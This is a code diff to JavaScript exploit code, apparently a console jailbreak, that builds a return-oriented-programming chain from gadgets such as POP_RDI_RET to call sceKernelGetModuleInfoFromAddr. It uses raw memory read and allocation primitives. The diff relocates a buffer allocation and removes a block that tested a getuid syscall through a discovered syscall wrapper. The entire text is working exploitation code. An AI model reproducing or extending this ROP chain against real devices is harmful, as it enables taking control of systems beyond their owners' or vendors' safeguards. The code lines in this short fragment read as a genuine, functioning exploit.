@@ -867,6 +867,9 @@ for (var i = 0; i < funcs.length; i++) {
 }
 
 var module_info_buf = mem.malloc(0x300)
+var store_size = 0x10
+var store_addr = mem.malloc(store_size)
+
 var insts = []
 
 insts.push(gadgets.POP_RDI_RET)
@@ -877,8 +880,6 @@ insts.push(gadgets.POP_RDX_RET)
 insts.push(module_info_buf)
 insts.push(sceKernelGetModuleInfoFromAddr_ptr)
 
-var store_size = 0x10
-var store_addr = mem.malloc(store_size)
 rop.store(insts, store_addr, 1)
 
 try {
@@ -1020,34 +1021,7 @@ try {
             break
         }
 
-        if (syscall_wrapper_addr) {
 
-            log("testing getuid Syscall")
-
-            var test_insts = []
-            test_insts.push(gadgets.POP_RAX_RET)
-            test_insts.push(new BigInt(0, 0x18))
-            test_insts.push(syscall_wrapper_addr)
-
-            var test_store_size = 0x10
-            var test_store_addr = mem.malloc(test_store_size)
-            rop.store(test_insts, test_store_addr, 1)
-
-            try {
-                rop.execute(test_insts, test_store_addr, test_store_size)
-
-                var uid = mem.read8(test_store_addr.add(new BigInt(0, 8)))
-                log("getuid returned: " + uid.lo())
-
-                mem.free(test_store_addr)
-            } catch (e) {
-                log("failed: " + e.message)
-                mem.free(test_store_addr)
-            }
-        } else {
-            log("")
-            log("ERROR: No syscall gadgets found")
-        }
     } else {
         log("ERROR: sceKernelGetModuleInfoFromAddr failed with code: " + ret_val.lo())
         mem.free(store_addr)
